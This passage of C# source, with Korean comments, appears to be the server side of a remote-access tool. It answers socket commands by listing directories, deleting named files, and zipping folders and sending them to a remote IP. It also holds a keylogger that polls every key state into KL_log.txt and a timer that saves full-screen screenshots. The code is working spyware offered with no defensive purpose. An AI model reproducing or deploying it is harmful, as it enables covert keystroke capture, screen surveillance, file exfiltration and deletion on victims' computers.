                                        ZipFile.CreateFromDirectory(path, Zip);
                                    }

                                    Yip = temp[1].ToString(); //다운로드 받는 컴퓨터의 IP
                                    ipep1 = new IPEndPoint(IPAddress.Parse(Yip), 7777);

                                    Socket server1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                    server1.Connect(ipep1);
                                    Console.WriteLine(Environment.NewLine + "접속완료!!");
                                    cts.chat = Environment.NewLine + "접속완료!!";
                                    cts.T2S = 1;
                                    FileStream fileStr = new FileStream(Zip, FileMode.Open, FileAccess.Read);
                                    int fileLength = (int)fileStr.Length;
                                    byte[] buffer = BitConverter.GetBytes(fileLength);
                                    server1.Send(buffer);
                                    int count = fileLength / 1024 + 1;

                                    BinaryReader reader = new BinaryReader(fileStr);

                                    for (int i = 0; i < count; i++)
                                    {
                                        buffer = reader.ReadBytes(1024);
                                        server1.Send(buffer);
                                    }
                                    reader.Close();
                                    server1.Close();

                                    if (File.Exists(Zip))
                                    {
                                        File.Delete(Zip);
                                    }
                                }
                                catch
                                {
                                    if (File.Exists(@"C:\work.zip"))
                                    {
                                        File.Delete(@"C:\work.zip");
                                    }
                                }
                            }
                            else
                            {
                                try
                                {
                                    string[] Dirtemp = temp[2].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                    //string Zip = "C:\\work.zip";
                                    string path = DR;
                                    //if (File.Exists(Zip))
                                    //{
                                    //    File.Delete(Zip);
                                    //}
                                    //else
                                    // {
                                    //    ZipFile.CreateFromDirectory(path, Zip);
                                    //}

                                    Yip = temp[1].ToString(); //다운로드 받는 컴퓨터의 IP
                                    ipep1 = new IPEndPoint(IPAddress.Parse(Yip), 7777);

                                    Socket server1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                    server1.Connect(ipep1);
                                    Console.WriteLine(Environment.NewLine + "접속완료!!");
                                    cts.chat = Environment.NewLine + "접속완료!!";
                                    cts.T2S = 1;
                                    FileStream fileStr = new FileStream(path, FileMode.Open, FileAccess.Read);
                                    int fileLength = (int)fileStr.Length;
                                    byte[] buffer = BitConverter.GetBytes(fileLength);
                                    server1.Send(buffer);
                                    int count = fileLength / 1024 + 1;

                                    BinaryReader reader = new BinaryReader(fileStr);

                                    for (int i = 0; i < count; i++)
                                    {
                                        buffer = reader.ReadBytes(1024);
                                        server1.Send(buffer);
                                    }
                                    reader.Close();
                                    server1.Close();
                                }
                                catch
                                {

                                }
                            }
                        }
                        else if (temp[0] == "DIR$")
                        {
                            try
                            {
                                Console.WriteLine(temp[1]);
                                cts.chat = temp[1];
                                cts.T2S = 1;
                                string STest = temp[1].ToString();
                                char[] Test = STest.ToCharArray(); //받은 값은 Char배열로 나열함

                                foreach (char ST in Test)
                                {
                                    if (ST == '*')
                                    {
                                        T = 1;
                                    }
                                }

                                if (T == 0) //에러인자가 "거짓" 일 경우 에러를 BroadCast 한 후에 return
                                {
                                    string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + msg;
                                    cts.T2S = 1;
                                }

                                else if (T == 1)
                                {
                                    string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                    Console.WriteLine("지정된 경로 : " + DR);
                                    cts.chat = "지정된 경로 : " + DR;
                                    cts.T2S = 1;
                                    byte[] buffer = Encoding.Unicode.GetBytes("Server : 지정된 경로 - " + DR + Environment.NewLine + "데이터를 탐색합니다.");
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);

                                    DirScan(Path.Combine(DR)); //함수를 새로 실행하여 값을 수동(?)으로 반환받는다
                                    string DirInfo = DIRSC; //반환값 저장

                                    byte[] Dir = Encoding.Unicode.GetBytes(DirInfo.ToString());
                                    newSocket.Send(Dir, Dir.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : 전송완료");
                                    Console.WriteLine();
                                    cts.chat = "Send data : 전송완료";
                                    cts.T2S = 1;

                                    T = 0; //초기화
                                    DIRSC = "";
                                }
                            }

                            catch
                            {

                                string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data : " + msg;
                                cts.T2S = 1;
                            }
                        }
                        else if (temp[0] == "DEF$")
                        {
                            try
                            {
                                string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                string Dtemp = ""; //수정된 경로를 저장할 곳이다.

                                for (int i = 0; i < Dirtemp.Length; i++)
                                {
                                    Dtemp += Dirtemp[i] + ":";
                                }
                                Dtemp = Dtemp.Substring(0, Dtemp.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                if (!File.Exists(Dtemp))
                                {
                                    string msg = "파일이 없거나 잘못입력되었습니다."; //Received 되는 문자열
                                    byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + msg;
                                    cts.T2S = 1;
                                }
                                else
                                {
                                    File.Delete(Dtemp);

                                    string msg = "삭제완료"; //Received 되는 문자열
                                    byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + msg;
                                    cts.T2S = 1;
                                }
                            }
                            catch
                            {
                                string msg = "파일이 없거나 잘못입력되었습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data : " + msg;
                                cts.T2S = 1;
                            }
                        }

                        else if (temp[0] == "DIRF$")
                        {
                            try
                            {
                                Console.WriteLine(temp[1]);
                                cts.chat = temp[1];
                                cts.T2S = 1;
                                string STest = temp[1].ToString();
                                char[] Test = STest.ToCharArray(); //받은 값은 Char배열로 나열함

                                foreach (char ST in Test)
                                {
                                    if (ST == '*')
                                    {
                                        T = 1;
                                    }
                                }

                                if (T == 0) //에러인자가 "거짓" 일 경우 에러를 BroadCast 한 후에 return
                                {
                                    string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + msg;
                                    cts.T2S = 1;
                                }

                                else if (T == 1)
                                {
                                    string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함


                                    Console.WriteLine("지정된 경로 : " + DR);
                                    cts.chat = "지정된 경로 : " + DR;
                                    cts.T2S = 1;
                                    byte[] buffer = Encoding.Unicode.GetBytes("Server : 지정된 경로 - " + DR + Environment.NewLine + "데이터를 탐색합니다.");
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);

                                    string DirInfo = "";


                                    DirectoryInfo Dtemp = new DirectoryInfo(DR);
                                    Console.WriteLine(Dtemp);
                                    cts.chat = Dtemp.ToString();
                                    cts.T2S = 1;
                                    DirInfo += Dtemp + Environment.NewLine;
                                    FileInfo[] files = Dtemp.GetFiles();
                                    foreach (FileInfo file2 in files) //파일 정보들을 반환함
                                    {
                                        DirInfo += Path.Combine(Dtemp.ToString() + "\\" + file2) + Environment.NewLine;
                                        Console.WriteLine(Path.Combine(Dtemp.ToString() + "\\" + file2));
                                        cts.chat = Path.Combine(Dtemp.ToString() + "\\" + file2);
                                        cts.T2S = 1;
                                    }

                                    byte[] Dir = Encoding.Unicode.GetBytes(DirInfo.ToString());
                                    newSocket.Send(Dir, Dir.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", Dir);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + Dir;
                                    cts.T2S = 1;

                                    T = 0; //초기화
                                }

                            }

                            catch
                            {
                                string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "Send data : " + msg;
                                cts.T2S = 1;
                            }

                        }
                        else if (temp[0] == "DIRO$")
                        {
                            try
                            {
                                Console.WriteLine(temp[1]);
                                cts.chat = temp[1];
                                cts.T2S = 1;
                                string STest = temp[1].ToString();
                                char[] Test = STest.ToCharArray(); //받은 값은 Char배열로 나열함

                                foreach (char ST in Test)
                                {
                                    if (ST == '*')
                                    {
                                        T = 1;
                                    }
                                }

                                if (T == 0) //에러인자가 "거짓" 일 경우 에러를 반환한 후에 return
                                {
                                    string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + msg;
                                    cts.T2S = 1;
                                }

                                else if (T == 1)
                                {
                                    string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                    Console.WriteLine("지정된 경로 : " + DR);
                                    cts.chat = "지정된 경로 : " + DR;
                                    cts.T2S = 1;
                                    byte[] buffer = Encoding.Unicode.GetBytes("Server : 지정된 경로 - " + DR + Environment.NewLine + "데이터를 탐색합니다.");
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);

                                    FolderScan(Path.Combine(DR)); //함수를 새로 실행하여 값을 수동(?)으로 반환받는다
                                    string DirInfo = FolderSC; //반환값 저장

                                    byte[] Dir = Encoding.Unicode.GetBytes(DirInfo.ToString());
                                    newSocket.Send(Dir, Dir.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", Dir);
                                    Console.WriteLine();
                                    cts.chat = "Send data : " + Dir;
                                    cts.T2S = 1;

                                    T = 0; //초기화
                                    FolderSC = "";
                                }
                            }

                            catch
                            {

                                string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                                cts.chat = "지정된 경로 : " + msg;
                                cts.T2S = 1;
                            }
                        }


                        else
                        {

                            string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                            byte[] buffer = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                            cts.chat = "Send data : " + msg;
                            cts.T2S = 1;

                        }


                    }
                    catch (SocketException se)
                    {
                        Console.WriteLine(se.Message);
                        break;
                    }

                }
            }

        } //함수끝나는 부분

        public void timer2_Elapsed(object sender, ElapsedEventArgs e) //키로그캡쳐 함수시작
        {
            key++;

            if (key == 5)
            {
                File.AppendAllText(KLPath + "KL_log.txt", Environment.NewLine + DateTime.Now.ToString("MM월-dd일-HH시-mm분-ss초"));

                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                var gfxScreenShot = Graphics.FromImage(bmpScreenshot);
                gfxScreenShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

                bmpScreenshot.Save("C:\\factory\\Key\\" + DateTime.Now.ToString("MM월-dd일-HH시-mm분-ss초") + ".png", ImageFormat.Png);
                bmpScreenshot.Dispose();

                key = 0;
            }

        }

        public void KLY()
        {
            Form1 cts = new Form1();
            while (true)
            {
                if (key2 == 1)
                {
                    for (Int32 i = 0; i < 255; i++)
                    {
                        int KeyState = GetAsyncKeyState(i);
                        if (KeyState == 1 || KeyState == -32767)
                        {
                            Console.WriteLine((Keys)i);
                            cts.chat = ((Keys)i).ToString();
                            cts.T2S = 1;

                            if (Convert.ToString((Keys)i) == "Tab" || Convert.ToString((Keys)i) == "ShiftKey"
                                || Convert.ToString((Keys)i) == "RShiftKey" || Convert.ToString((Keys)i) == "Back" || Convert.ToString((Keys)i) == "LButton"
                                || Convert.ToString((Keys)i) == "RButton" || Convert.ToString((Keys)i) == "Capital" || Convert.ToString((Keys)i) == "ContorlKey"
                                || Convert.ToString((Keys)i) == "LControlKey" || Convert.ToString((Keys)i) == "LMenu" || Convert.ToString((Keys)i) == "Menu"
                                || Convert.ToString((Keys)i) == "Oem5" || Convert.ToString((Keys)i) == "Return" || Convert.ToString((Keys)i) == "Up"
                                || Convert.ToString((Keys)i) == "Down" || Convert.ToString((Keys)i) == "Left" || Convert.ToString((Keys)i) == "Right"
                                || Convert.ToString((Keys)i) == "Decimal" || Convert.ToString((Keys)i) == "OemPeriod" || Convert.ToString((Keys)i) == "Oemcomma"
                                || Convert.ToString((Keys)i) == "Oem7" || Convert.ToString((Keys)i) == "KanaMode" || Convert.ToString((Keys)i) == "HanjaMode"
                                || Convert.ToString((Keys)i) == "NumLock" || Convert.ToString((Keys)i) == "Space" || Convert.ToString((Keys)i) == "Home"
                                || Convert.ToString((Keys)i) == "End" || Convert.ToString((Keys)i) == "PageUp" || Convert.ToString((Keys)i) == "Next"
                                || Convert.ToString((Keys)i) == "Delete" || Convert.ToString((Keys)i) == "Insert" || Convert.ToString((Keys)i) == "Escape"
                                || Convert.ToString((Keys)i) == "OemQuestion")
                            {
                                if (!Directory.Exists(KLPath))
                                {

                                    Directory.CreateDirectory(KLPath);
                                    string toStringKeys = Convert.ToString((Keys)i);
                                    File.AppendAllText(KLPath + "KL.log.txt", " [" + toStringKeys + "] ");
                                    break;
                                }

                                else
                                {
                                    string toStringKeys = Convert.ToString((Keys)i);
                                    File.AppendAllText(KLPath + "KL_log.txt", " [" + toStringKeys + "] ");
                                    break;
                                }
                            }
                            else
                            {
                                if (!Directory.Exists(KLPath))
                                {

                                    Directory.CreateDirectory(KLPath);
                                    string toStringKeys = Convert.ToString((Keys)i);
                                    File.AppendAllText(KLPath + "KL.log.txt", "+" + toStringKeys);
                                    break;
                                }

                                else
                                {
                                    string toStringKeys = Convert.ToString((Keys)i);
                                    File.AppendAllText(KLPath + "KL_log.txt", "+" + toStringKeys);
                                    break;
                                }
                            }
                        }
                    }
                }
                else
                {
                    return;
                }
            }
        }

        public void FolderScan(string name)
        {
            try
            {
                Form1 cts = new Form1();
                string[] dir = Directory.GetDirectories(name);
                foreach (string Dtemp in dir)
                {
                    Console.WriteLine(Dtemp);
                    FolderSC += Dtemp + Environment.NewLine;
                    cts.chat = Dtemp;
                    cts.T2S = 1;
                }
            }
            catch
            {

            }
        }

        public void DirScan(string name)
        {
            try
            {
                Form1 cts = new Form1();
                string[] dir = Directory.GetDirectories(name);
                foreach (string Dtemp in dir)
                {
                    Console.WriteLine(Dtemp);
                    DIRSC += Dtemp + Environment.NewLine;
                    cts.chat = Dtemp;
                    cts.T2S = 1;

                    string[] files = Directory.GetFiles(Dtemp);
                    foreach (string FTemp in files)
                    {
                        Console.WriteLine(FTemp);
                        DIRSC += FTemp + Environment.NewLine;
                        cts.chat = FTemp;
                        cts.T2S = 1;
                    }

                    DirScan(Dtemp);
                }
            }

            catch
            {

            }
        }
    }

    class test1
    {
        public List<Int32> a
        {
            get;
            set;
        }
    }



   
}
